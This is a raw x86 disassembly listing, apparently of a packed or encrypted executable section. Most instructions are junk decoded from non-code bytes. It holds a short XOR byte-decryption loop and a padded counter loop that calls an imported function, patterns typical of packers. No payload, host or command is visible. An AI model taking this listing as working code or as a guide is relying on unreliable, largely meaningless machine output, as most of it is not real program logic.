  4031a4:	add    eax,0xb366103b
  4031a9:	or     BYTE PTR [esi+eiz*2-0x39],bl
  4031ad:	sbb    al,0x73
  4031af:	test   DWORD PTR [esi-0x2b635604],eax
  4031b5:	xor    dh,BYTE PTR [edi]
  4031b7:	retf   
  4031b8:	dec    esp
  4031b9:	push   ebp
  4031ba:	pop    edi
  4031bb:	add    al,al
  4031bd:	test   al,0x89
  4031bf:	mov    edx,DWORD PTR [esi-0x3eb83323]
  4031c5:	sbb    al,0x41
  4031c7:	mov    edi,0x3d537c99
  4031cc:	xchg   ebx,eax
  4031cd:	mov    ?,WORD PTR [ecx]
  4031cf:	inc    edi
  4031d0:	sub    DWORD PTR [ecx+0x2672c79c],edi
  4031d6:	bound  ebx,QWORD PTR [eax-0x4d]
  4031d9:	mov    BYTE PTR [ecx],0xc1
  4031dc:	inc    ebx
  4031dd:	and    esp,0x1b0b252
  4031e3:	jecxz  0x40324f
  4031e5:	scas   eax,DWORD PTR es:[edi]
  4031e6:	or     dl,BYTE PTR ds:0x503c65cc
  4031ec:	xor    BYTE PTR [edi+edx*8],ah
  4031ef:	test   BYTE PTR [edi-0x4dd180e0],bl
  4031f5:	mov    al,ds:0xc7884f
  4031fa:	push   0x25
  4031fc:	xor    ebx,DWORD PTR [edi-0x76b04e0d]
  403202:	xor    dh,BYTE PTR [edx-0x27c0fdfe]
  403208:	aas    
  403209:	jp     0x4031ed
  40320b:	adc    al,BYTE PTR [edx-0x37457222]
  403211:	(bad)  
  403213:	ss mov edx,0xc2df3867
  403219:	dec    eax
  40321a:	push   ebx
  40321b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40321c:	arpl   di,si
  40321e:	mov    ecx,0x23db89ae
  403223:	retf   
  403224:	or     dh,bl
  403226:	and    eax,0xb29d446f
  40322b:	loopne 0x40323e
  40322d:	inc    ebx
  40322e:	sub    ch,ah
  403230:	xchg   esp,eax
  403231:	sbb    DWORD PTR [edi*8+0x15a96b20],ebx
  403238:	fcomp  QWORD PTR [edx-0x79]
  40323b:	push   0x164f051d
  403240:	popa   
  403241:	xor    al,0x4b
  403243:	mov    ch,0x2d
  403245:	dec    ebp
  403246:	adc    ebx,esp
  403248:	dec    ecx
  403249:	cmp    al,0x12
  40324b:	ds (bad) 
  40324d:	aam    0xf4
  40324f:	xor    DWORD PTR [ebp-0x1b],eax
  403252:	sub    eax,0xa8488c4d
  403257:	inc    ebp
  403258:	scas   al,BYTE PTR es:[edi]
  403259:	(bad)
  40325c:	jp     0x40326e
  40325e:	or     ebx,ebp
  403260:	cli    
  403261:	call   0x98aa4917
  403266:	in     al,dx
  403267:	pop    ecx
  403268:	pop    edx
  403269:	outs   dx,BYTE PTR ds:[esi]
  40326a:	and    BYTE PTR [esi],bl
  40326c:	xlat   BYTE PTR ds:[ebx]
  40326d:	aas    
  40326e:	sar    DWORD PTR [ebx+0x4b80419],1
  403274:	je     0x4032c6
  403276:	sub    ecx,DWORD PTR [ecx-0x20]
  403279:	je     0x4032d3
  40327b:	lahf   
  40327c:	mov    ch,0xeb
  40327e:	xor    ecx,DWORD PTR [edi+esi*2]
  403281:	dec    esi
  403282:	popf   
  403283:	outs   dx,BYTE PTR ds:[esi]
  403284:	push   cs
  403285:	sub    eax,0x56335002
  40328a:	or     ebx,DWORD PTR ds:0x828139a5
  403290:	jmp    0x4032e8
  403292:	sub    BYTE PTR [esi+ebp*1],dl
  403295:	xchg   esp,eax
  403296:	add    DWORD PTR [eax],ebx
  403298:	into   
  403299:	fcmovnu st,st(1)
  40329b:	nop
  40329c:	pop    esi
  40329d:	push   0x74bc7f3a
  4032a2:	jg     0x403279
  4032a4:	and    edi,ebx
  4032a6:	aam    0x3
  4032a8:	out    dx,eax
  4032a9:	lds    ebx,FWORD PTR [esi]
  4032ab:	mov    WORD PTR [esi-0x74],ds
  4032ae:	mov    cl,0xf9
  4032b0:	rol    BYTE PTR [ebp-0x2a],cl
  4032b3:	clc    
  4032b4:	js     0x403329
  4032b6:	stos   DWORD PTR es:[edi],eax
  4032b7:	inc    esi
  4032b8:	jae    0x403250
  4032ba:	int    0x41
  4032bc:	or     eax,0xfea27ae2
  4032c1:	add    eax,0x22942c56
  4032c6:	sub    eax,0x9f3723cd
  4032cb:	cdq    
  4032cc:	adc    al,0xd6
  4032ce:	popa   
  4032cf:	add    cl,BYTE PTR [ecx-0x37aed8b3]
  4032d5:	xlat   BYTE PTR ds:[ebx]
  4032d6:	adc    eax,0xa286f06d
  4032db:	fiadd  WORD PTR [esi+0x5525f9ae]
  4032e1:	add    DWORD PTR [esi+0x52],0x5219d190
  4032e8:	add    BYTE PTR [edi],al
  4032ea:	stos   DWORD PTR es:[edi],eax
  4032eb:	push   0x37f8820d
  4032f0:	addr16 sbb al,0x96
  4032f3:	and    DWORD PTR [eiz*4-0x2a39eca4],0xf7168136
  4032fe:	jg     0x403306
  403300:	push   es
  403301:	in     al,0x66
  403303:	mov    ds:0x46e26bfb,eax
  403308:	in     eax,dx
  403309:	sub    BYTE PTR [edx+0x1d2ab504],bh
  40330f:	xchg   ebp,eax
  403310:	idiv   BYTE PTR [edx-0x47]
  403313:	cdq    
  403314:	mov    ebp,0xf717a86a
  403319:	js     0x403308
  40331b:	mov    bl,0x2b
  40331d:	call   0x9913:0x571bf3f1
  403324:	xchg   edi,eax
  403325:	inc    eax
  403326:	or     BYTE PTR [ebx-0x61],0x2c
  40332a:	test   eax,0xe898ea64
  40332f:	dec    ebp
  403330:	outs   dx,BYTE PTR ds:[esi]
  403331:	mov    esp,eax
  403333:	ss pop esi
  403335:	mov    esp,0xf07ce0b3
  40333a:	pop    es
  40333b:	pop    esi
  40333c:	and    eax,0x8e80162e
  403341:	add    ebp,DWORD PTR [esi]
  403343:	clc    
  403344:	shr    BYTE PTR [eax+ecx*2],0x9
  403348:	push   esi
  403349:	cwde   
  40334a:	dec    eax
  40334b:	or     BYTE PTR [eax],al
  40334d:	add    al,ah
  40334f:	mov    al,ds:0xab473a0d
  403354:	addr16 or edx,eax
  403357:	jo     0x4033ca
  403359:	adc    BYTE PTR [edx],ah
  40335b:	rol    BYTE PTR [edx],cl
  40335d:	and    BYTE PTR [ebx],bl
  40335f:	out    dx,eax
  403360:	mov    edx,eax
  403362:	jmp    FWORD PTR [edx-0x44952628]
  403368:	dec    eax
  403369:	pushf  
  40336a:	and    DWORD PTR [eax],edi
  40336c:	pop    ecx
  40336d:	call   0x3880:0xe7caddd3
  403374:	jmp    esi
  403376:	and    ecx,esi
  403378:	and    ebx,DWORD PTR [ebp+edi*1-0x47]
  40337c:	sub    ebx,eax
  40337e:	icebp  
  40337f:	loop   0x4033e8
  403381:	mov    edi,0x33892b05
  403386:	dec    esi
  403387:	inc    BYTE PTR [esi+0x237a3b41]
  40338d:	cdq    
  40338e:	cs (bad) 
  403390:	mov    ch,0xda
  403392:	or     BYTE PTR [edi-0x5c],0x42
  403396:	(bad)  
  403397:	sar    eax,1
  403399:	sbb    eax,0x8758b9c
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	pop    edx
  4033ba:	add    DWORD PTR [esi-0x72],0x3a
  4033be:	adc    al,0x70
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x4033d8
  4033c6:	mov    al,0x44
  4033c8:	cmp    al,0xfd
  4033ca:	pop    ebp
  4033cb:	xor    bl,ah
  4033cd:	xchg   esi,eax
  4033ce:	push   ecx
  4033cf:	or     DWORD PTR [edi-0xf],edi
  4033d2:	jl     0x40344a
  4033d4:	fwait
  4033d5:	les    ecx,FWORD PTR [ebx+0x5e352cac]
  4033db:	aam    0xcb
  4033dd:	push   es
  4033de:	xor    eax,edi
  4033e0:	jnp    0x403450
  4033e2:	fld    TBYTE PTR ds:0x171bf210
  4033e8:	out    0x63,al
  4033ea:	in     eax,dx
  4033eb:	pushf  
  4033ec:	jnp    0x4033c7
  4033ee:	sar    BYTE PTR [esi+0x6c],cl
  4033f1:	pop    ds
  4033f2:	call   ebx
  4033f4:	mov    WORD PTR [edi+0xc],es
  4033f7:	es jle 0x4033a4
  4033fa:	enterw 0xd270,0x32
  4033ff:	aaa    
  403400:	pop    ebx
  403401:	sti    
  403402:	cmp    eax,0xc98d4d6a
  403407:	scas   al,BYTE PTR es:[edi]
  403408:	cmp    eax,0xb0aa4800
  40340d:	ret    
  40340e:	and    dl,ah
  403410:	mov    ebp,0x9794ff80
  403415:	(bad)  
  403416:	xchg   edx,eax
  403417:	or     BYTE PTR [eax],dl
  403419:	pextrw eax,mm5,0x23
  40341d:	add    eax,0x22c83c14
  403422:	mul    dl
  403424:	out    0x46,al
  403426:	mov    ah,0xb5
  403428:	push   ss
  403429:	cs xchg ecx,eax
  40342b:	jmp    0xffbe:0x1f0ca682
  403432:	(bad)  
  403433:	out    0x9b,al
  403435:	mov    ebx,0x991c9b0d
  40343a:	aam    0x93
  40343c:	retf   0xebd5
  40343f:	push   esi
  403440:	add    al,0x8b
  403442:	xchg   ecx,eax
  403443:	pcmpeqb mm3,mm2
  403446:	sbb    eax,DWORD PTR [ebx-0x68f894ac]
  40344c:	fcomp  st(6)
  40344e:	(bad)  
  40344f:	aaa    
  403450:	ror    BYTE PTR [esp+esi*8+0x623713fc],cl
  403457:	out    dx,al
  403458:	xor    al,0xb4
  40345a:	and    al,0x44
  40345c:	jne    0x4034b8
  40345e:	mov    al,ds:0xba163341
  403463:	mov    esp,DWORD PTR [ebx]
  403465:	mov    dh,0xf7
  403467:	cmp    dh,BYTE PTR [edi-0x5a]
  40346a:	xchg   BYTE PTR [edi-0x20],bl
  40346d:	dec    ecx
  40346e:	loopne 0x403452
  403470:	fmul   DWORD PTR ds:0xa5517099
  403476:	or     al,0xfc
  403478:	mov    BYTE PTR [edx],bl
  40347a:	lds    esp,FWORD PTR [eax]
  40347c:	cdq    
  40347d:	fs xchg edx,eax
  40347f:	and    edi,edx
  403481:	mov    ebx,0x6282b180
  403486:	stos   BYTE PTR es:[edi],al
  403487:	push   esi
  403488:	xor    al,al
  40348a:	test   BYTE PTR [ecx+eiz*2-0x6a],0x48
  40348f:	and    eax,0x2a9f88a0
  403494:	pop    edx
  403495:	xlat   BYTE PTR ds:[ebx]
  403496:	sbb    edx,DWORD PTR [edx+ebp*8+0x63]
  40349a:	stos   BYTE PTR es:[edi],al
  40349b:	cmp    ah,BYTE PTR [ebx+0x70]
  40349e:	mov    BYTE PTR [ebp-0x50687139],dl
  4034a4:	inc    esp
  4034a5:	fwait
  4034a6:	in     eax,dx
  4034a7:	sbb    ch,BYTE PTR [ebx+0x73]
  4034aa:	push   esp
  4034ab:	xor    ecx,ecx
  4034ad:	xchg   edx,eax
  4034ae:	push   es
  4034af:	jno    0x40349d
  4034b1:	jmp    0xccd754ef
  4034b6:	jno    0x403449
  4034b8:	inc    al
  4034ba:	pop    edi
  4034bb:	(bad)  
  4034bd:	mov    DWORD PTR [ebx+0x7f644d5e],edi
  4034c3:	fdivr  DWORD PTR [edi]
  4034c5:	(bad)  
  4034c6:	sti    
  4034c7:	add    BYTE PTR [edi+0x5395e925],0x62
  4034ce:	mov    ah,0x1d
  4034d0:	or     ch,ah
  4034d2:	(bad)  
  4034d3:	sti    
  4034d4:	jecxz  0x4034e4
  4034d6:	or     ecx,DWORD PTR [ecx+0x30dbd655]
  4034dc:	sub    al,0xbb
  4034de:	sbb    esi,DWORD PTR [edx+ebx*2-0xf1ff47a]
  4034e5:	mov    cl,0xb8
  4034e7:	add    DWORD PTR [edi+eiz*4],0xffffffe8
  4034eb:	je     0x4034e8
  4034ed:	sti    
  4034ee:	inc    ebx
  4034ef:	sub    DWORD PTR [edi-0x32],esi
  4034f2:	mov    ds:0x4b28493d,eax
  4034f7:	adc    edi,esp
  4034f9:	popf   
  4034fa:	xchg   edx,eax
  4034fb:	sub    DWORD PTR [edx+0x35],0x86e03003
  403502:	pop    ebx
  403503:	call   0x853f:0x7d4d41b6
  40350a:	(bad)  [edi]
  40350c:	int    0x23
  40350e:	(bad)  
  40350f:	clc    
  403510:	out    dx,al
  403511:	(bad)  
  403512:	jge    0x403539
  403514:	fbstp  TBYTE PTR [esi]
  403516:	imul   eax,DWORD PTR [ecx],0xffffffae
  403519:	mov    bh,0x10
  40351b:	test   al,0x88
  40351d:	bound  ebx,QWORD PTR [edi-0x31]
  403520:	adc    ah,al
  403522:	jmp    0xd32b9a79
  403527:	fld    DWORD PTR [eax]
  403529:	cmc    
  40352a:	mov    al,ds:0xf301a04e
  40352f:	addr16 test al,0x6b
  403532:	sub    al,BYTE PTR [edx+0x2f03b09]
  403538:	xchg   esi,eax
  403539:	pop    edi
  40353a:	or     DWORD PTR [eax-0x2931e108],0xffffffb7
  403541:	mov    eax,0xe936a99
  403546:	sbb    eax,0x4817497c
  40354b:	stos   BYTE PTR es:[edi],al
  40354c:	lea    ecx,[esi]
  40354e:	add    al,0x3e
  403550:	in     eax,dx
  403551:	mov    ds:0xd0c4afae,al
  403556:	sbb    al,BYTE PTR [edx]
  403558:	dec    esp
  403559:	pusha  
  40355a:	lds    edx,FWORD PTR [eax+0x48]
  40355d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40355e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  403560:	lea    ebx,[ebp-0x36d7a214]
  403566:	xchg   ecx,eax
  403567:	retfw  
  403569:	sub    ah,ch
  40356b:	ds push 0xffffffe6
  40356e:	loop   0x4035cf
  403570:	inc    eax
  403571:	aas    
  403572:	je     0x40353f
  403574:	cwde   
  403575:	mov    dh,0xad
  403577:	lock rcl BYTE PTR [ebp+0x24],0xd5
  40357c:	dec    eax
  40357d:	sub    eax,0x8bbc3010
  403582:	loope  0x4035fb
  403584:	out    0x2e,eax
  403586:	jg     0x403516
  403588:	aad    0x7a
  40358a:	dec    ebp
  40358b:	repnz sbb esi,ebx
  40358e:	add    esi,0xffffffca
  403591:	in     eax,0xdf
  403593:	ja     0x403560
  403595:	sbb    BYTE PTR [edx],ah
  403597:	dec    ebp
  403598:	xor    ch,BYTE PTR [ecx]
  40359a:	inc    ebp
  40359b:	add    eax,0xb9b10643
  4035a0:	cld    
  4035a1:	loopne 0x4035c1
  4035a3:	test   BYTE PTR [esp+ebp*4],0xaf
  4035a7:	jo     0x403531
  4035a9:	sbb    DWORD PTR [edi],edx
  4035ab:	jmp    edi
  4035ad:	sahf   
  4035ae:	mov    es,WORD PTR [edi]
  4035b0:	inc    edx
  4035b1:	cmp    ebx,eax
  4035b3:	sbb    eax,0x9d2ab65f
  4035b8:	mov    ebp,DWORD PTR [ebx+0x52222f5d]
  4035be:	sbb    al,BYTE PTR [edx-0x1b]
  4035c1:	and    al,0x60
  4035c3:	xor    dl,dl
  4035c5:	cli    
  4035c6:	sbb    edi,esp
  4035c8:	es (bad) 
  4035ca:	sub    eax,0xeb14000b
  4035cf:	xor    BYTE PTR [ebx*2+0x12d2c611],dl
  4035d6:	xor    bl,dh
  4035d8:	shl    DWORD PTR [eax],1
  4035da:	call   0x1323ab71
  4035df:	mov    edi,0x1a1e7970
  4035e4:	jg     0x4035f9
  4035e6:	mul    DWORD PTR [ecx+0x518d307b]
  4035ec:	(bad)  
  4035ed:	dec    esp
  4035ee:	outs   dx,BYTE PTR ds:[esi]
  4035ef:	mov    ecx,0x5e1a3f4
  4035f4:	lods   eax,DWORD PTR ds:[esi]
  4035f5:	cmp    eax,0xca530b06
  4035fa:	mov    dl,0x73
  4035fc:	div    BYTE PTR [edi+0x36]
  4035ff:	sbb    eax,0x839ca169
  403604:	xchg   ebx,eax
  403605:	call   0x5f26:0x646832c9
  40360c:	or     ecx,DWORD PTR [ebx+0x27]
  40360f:	and    BYTE PTR [edx-0x5387c11],cl
  403615:	xor    DWORD PTR [ebx+0x20],0x76
  403619:	in     al,dx
  40361a:	inc    edi
  40361b:	mov    al,ds:0xb83d7b8
  403620:	js     0x4035c9
  403622:	mov    esp,0x92623e44
  403627:	aam    0x15
  403629:	(bad)  [ebx-0x73aea6fe]
  40362f:	or     al,0x35
  403631:	fcomp  QWORD PTR [esi]
  403633:	test   al,0xec
  403635:	in     al,0x91
  403637:	fdiv   QWORD PTR [ebx+ecx*4+0x45]
  40363b:	fistp  DWORD PTR [esi]
  40363d:	dec    esi
  40363e:	pop    ebp
  40363f:	mov    edi,DWORD PTR [eax+0x51]
  403642:	sub    DWORD PTR [esi-0x54],0x4c3d1aa4
  403649:	fcom   DWORD PTR ds:0x1110d11a
  40364f:	and    dl,BYTE PTR [eax+ebp*4+0x66c53993]
  403656:	ins    BYTE PTR es:[edi],dx
  403657:	das    
  403658:	inc    eax
  403659:	out    0xe0,eax
  40365b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40365d:	mov    dh,0x52
  40365f:	sub    al,0x53
  403662:	cvtps2pi mm4,QWORD PTR [edx]
  403665:	aam    0xb7
  403667:	dec    esi
  403668:	adc    eax,0x686a5ebc
  40366d:	inc    edi
  40366e:	jns    0x4035fa
  403670:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403671:	std    
  403672:	xchg   esp,eax
  403673:	out    0xd7,eax
  403675:	(bad)  
  403676:	ins    DWORD PTR es:[edi],dx
  403677:	adc    DWORD PTR [eax-0x83175a],edi
  40367d:	adc    eax,0xf5bd3e2f
  403682:	mov    BYTE PTR [eax-0x3e],cl
  403685:	jl     0x40360f
  403687:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fd6d,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fd6d,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fd6d,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e357
  4036fc:	cmp    DWORD PTR ds:0x42fd6d,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fd6d
  403711:	dec    eax
  403712:	mov    ds:0x42fd6d,eax
  403717:	mov    eax,ds:0x42fd6d
  40371c:	dec    eax
  40371d:	mov    ds:0x42fd6d,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e773,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e777,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd8d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e793,0x42e19c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fdfa,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e1a4,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e78f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    edx,edi
  4037a2:	sub    eax,0x11789e02
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0x5070707d
  4037ae:	mov    ?,WORD PTR [edx+0x62e27977]
  4037b4:	ins    DWORD PTR es:[edi],dx
  4037b5:	arpl   WORD PTR [ecx],bx
  4037b7:	cwde   
  4037b8:	and    ch,dh
  4037ba:	jns    0x40380b
  4037bc:	adc    ah,ah
  4037be:	inc    ebp
  4037bf:	inc    edx
  4037c0:	jno    0x4037b2
  4037c2:	pop    es
  4037c3:	cdq    
  4037c4:	je     0x403782
  4037c6:	aam    0x68
  4037c8:	push   0x1e92fd6b
  4037cd:	xchg   edx,eax
  4037ce:	dec    ecx
  4037cf:	cmp    al,0x80
  4037d1:	call   0x5c6d0788
  4037d6:	psubd  mm6,mm0
  4037d9:	push   cs
  4037da:	xor    DWORD PTR [ecx+eiz*8+0x25d180ea],ebp
  4037e1:	out    dx,eax
  4037e2:	jo     0x4037f1
  4037e4:	cmp    al,0x4b
  4037e6:	js     0x403851
  4037e8:	out    0x9b,al
  4037ea:	mov    ecx,0x5a258fd8
  4037ef:	aaa    
  4037f0:	adc    al,0x4
  4037f2:	stos   BYTE PTR es:[edi],al
  4037f3:	sub    al,0x9f
  4037f5:	sahf   
  4037f6:	cmp    ecx,DWORD PTR gs:[edx+0x19]
  4037fa:	rcr    ebx,0x4f
  4037fd:	cmp    edx,edx
  4037ff:	push   esi
  403800:	pop    edx
  403801:	test   eax,0x7f0a2b3
  403806:	push   esi
  403807:	or     bh,bl
  403809:	or     BYTE PTR [ebx+0x1c],cl
  40380c:	pushf  
  40380d:	sub    eax,0xdd18dde6
  403812:	push   esi
  403813:	loop   0x4037b4
  403815:	mov    dh,0x2f
  403817:	setge  bl
  40381a:	fdivr  DWORD PTR [ebp-0x3c]
  40381d:	and    DWORD PTR [esi],edi
  40381f:	inc    eax
  403820:	xchg   esp,eax
  403821:	jmp    0xa5b6:0x72fe330f
  403828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403829:	xor    ah,ch
  40382b:	and    eax,0x98266254
  403830:	jl     0x403810
  403832:	into   
  403833:	jne    0x403808
  403835:	sar    DWORD PTR [ecx+0x75acd1b2],cl
  40383b:	push   ds
  40383c:	fcomp  QWORD PTR ds:0xa6f8d569
  403842:	adc    BYTE PTR [ecx-0x53da1deb],0x20
  403849:	xor    al,BYTE PTR [ebp-0x1a0232db]
  40384f:	sti    
  403850:	arpl   WORD PTR [eax+0x444778e5],dx
  403856:	inc    edi
  403857:	dec    DWORD PTR [ebp+0x62f6e53f]
  40385d:	xchg   ebp,eax
  40385e:	imul   ecx,DWORD PTR [edi-0x51a42e35],0xc3dfe0e6
  403868:	and    DWORD PTR [ebx-0x40],ecx
  40386b:	inc    ebp
  40386c:	das    
  40386d:	sub    eax,0x251b003d
  403872:	sti    
  403873:	lods   al,BYTE PTR ds:[esi]
  403874:	pop    ss
  403875:	and    DWORD PTR [ebx+esi*8],ecx
  403878:	in     eax,0xda
  40387a:	jne    0x4038e9
  40387c:	shl    BYTE PTR ds:0x7e212f7d,0xf7
  403883:	outs   dx,DWORD PTR ds:[esi]
  403884:	and    DWORD PTR [edi-0x6a],edi
  403887:	iret   
  403888:	or     DWORD PTR fs:[eax],esi
  40388b:	xchg   edi,eax
  40388c:	mov    edi,0x93154799
  403891:	xchg   esp,eax
  403892:	into   
  403893:	cmp    BYTE PTR [edi],ah
  403895:	dec    ecx
  403896:	nop
  403897:	pop    edi
  403898:	inc    esi
  403899:	cmp    al,0xc5
  40389b:	jl     0x4038c4
  40389d:	loope  0x403826
  40389f:	and    eax,0x447a882a
  4038a4:	cmp    al,0x6a
  4038a6:	or     edi,esp
  4038a8:	xor    bh,BYTE PTR [ebp+0x3d6e37e4]
  4038ae:	outs   dx,DWORD PTR ds:[esi]
  4038af:	retf   
  4038b0:	add    BYTE PTR [ecx+esi*1],ch
  4038b3:	fidiv  DWORD PTR es:[ebx-0x20]
  4038b7:	std    
  4038b8:	push   edx
  4038b9:	pop    eax
  4038ba:	push   ebp
  4038bb:	call   0x47e9:0xfb24004f
  4038c2:	mov    dh,0x29
  4038c4:	mov    eax,ds:0x86355649
  4038c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038ca:	fs sti 
  4038cc:	jmp    0xc31281aa
  4038d1:	cmp    DWORD PTR [ecx+ebx*1],0x7c
  4038d5:	sahf   
  4038d6:	fist   WORD PTR [edi]
  4038d8:	cli    
  4038d9:	scas   al,BYTE PTR es:[edi]
  4038da:	icebp  
  4038db:	inc    ebp
  4038dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038dd:	and    al,0x49
  4038df:	repz or edx,ecx
  4038e2:	cdq    
  4038e3:	xchg   ecx,eax
  4038e4:	sti    
  4038e5:	out    0x69,al
  4038e7:	loop   0x403905
  4038e9:	mov    ecx,0x10ed5bb7
  4038ee:	psllq  mm2,QWORD PTR [edx-0x43]
  4038f2:	jno    0x403962
  4038f4:	addr16 sbb eax,0xf77be991
  4038fa:	(bad)  
  4038fb:	cmp    al,0x38
  4038fd:	add    BYTE PTR [edi],al
  4038ff:	pop    ds
  403900:	lds    eax,FWORD PTR [edx-0x5309a692]
  403906:	xor    cl,dl
  403908:	or     al,0xbc
  40390a:	mov    cl,0x39
  40390c:	xor    bh,BYTE PTR [ecx+ebp*4]
  40390f:	mov    eax,ds:0xfa0f28d9
  403914:	clc    
  403915:	lods   eax,DWORD PTR ds:[esi]
  403916:	xchg   esi,eax
  403917:	push   ebx
  403918:	push   ecx
  403919:	or     esi,DWORD PTR [ebp-0xe]
  40391c:	arpl   WORD PTR [eax-0x67],si
  40391f:	xor    al,0xb2
  403921:	mov    BYTE PTR [edi],0x14
  403924:	or     BYTE PTR [esi+ecx*2-0x70],bh
  403928:	cwde   
  403929:	stos   DWORD PTR es:[edi],eax
  40392a:	ins    BYTE PTR es:[edi],dx
  40392b:	outs   dx,BYTE PTR ds:[esi]
  40392c:	pop    es
  40392d:	packssdw mm3,QWORD PTR [ecx+0x7]
  403931:	ficom  WORD PTR [ebx]
  403933:	jns    0x4038f6
  403935:	ins    BYTE PTR es:[edi],dx
  403936:	jne    0x40395d
  403938:	adc    esp,ebx
  40393a:	jne    0x403905
  40393c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40393d:	clc    
  40393e:	add    bh,BYTE PTR [edi+0x42c5f788]
  403944:	popa   
  403945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403946:	fimul  WORD PTR [esi-0x42e8661e]
  40394c:	mov    DWORD PTR ds:0xd4d68c15,ebx
  403952:	mov    DWORD PTR [ebp+0x5d],ecx
  403955:	shr    WORD PTR [ebx-0xc],1
  403959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40395a:	addr16 jmp 0x36dc:0xc87af82e
  403962:	fs or  dl,0xf7
  403966:	inc    ecx
  403967:	and    bl,BYTE PTR [eax-0x5e]
  40396a:	mov    al,ds:0xbb352dbc
  40396f:	out    dx,al
  403970:	jecxz  0x403929
  403972:	mov    ecx,0x220f4582
  403977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403978:	pushf  
  403979:	xor    al,0x60
  40397b:	cli    
  40397c:	mov    esp,0xd36eaeb9
  403981:	outs   dx,BYTE PTR ds:[esi]
  403982:	push   ebx
  403983:	cmp    cl,BYTE PTR es:[ecx]
  403986:	sub    eax,0x6ec1262d
  40398b:	ins    BYTE PTR es:[edi],dx
  40398c:	xchg   edi,eax
  40398d:	xlat   BYTE PTR ds:[ebx]
  40398e:	mov    ds:0x60496f27,eax
  403993:	ret    0x5cbb
  403996:	push   edx
  403997:	mov    ebp,DWORD PTR [ebx+0x57]
  40399a:	inc    ebp
  40399b:	aam    0x3e
  40399d:	mov    ebx,0xe48cdae1
  4039a2:	cdq    
  4039a3:	cmp    dl,dl
  4039a5:	jae    0x4039f2
  4039a7:	jnp    0x4039e6
  4039a9:	test   eax,0x79445b0a
  4039ae:	int3   
  4039af:	jge    0x403a0d
  4039b1:	test   eax,0xe3d0eb90
  4039b6:	stc    
  4039b7:	pop    edx
  4039b8:	retf   0x6c46
  4039bb:	xlat   BYTE PTR ds:[ebx]
  4039bc:	or     eax,0x2c566987
  4039c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039c2:	push   cs
  4039c3:	cmp    ebx,edx
  4039c5:	jp     0x403999
  4039c7:	xchg   DWORD PTR [edx-0x7e],ebx
  4039ca:	or     BYTE PTR [eax-0x3ed59e7c],ah
  4039d0:	repz hlt 
  4039d2:	outs   dx,BYTE PTR ds:[esi]
  4039d3:	sar    BYTE PTR [ebx],0xf0
  4039d6:	(bad)  
  4039d7:	dec    esp
  4039d8:	sbb    edi,DWORD PTR [esi+0x3ca8f868]
  4039de:	sub    ebp,DWORD PTR [edx-0x2a]
  4039e1:	loope  0x403a57
  4039e3:	ss jae 0x403a42
  4039e6:	xor    eax,0x794eb626
  4039eb:	inc    edx
  4039ec:	or     ebp,DWORD PTR [edx]
  4039ee:	dec    edx
  4039ef:	add    ch,0xee
  4039f2:	jge    0x40399e
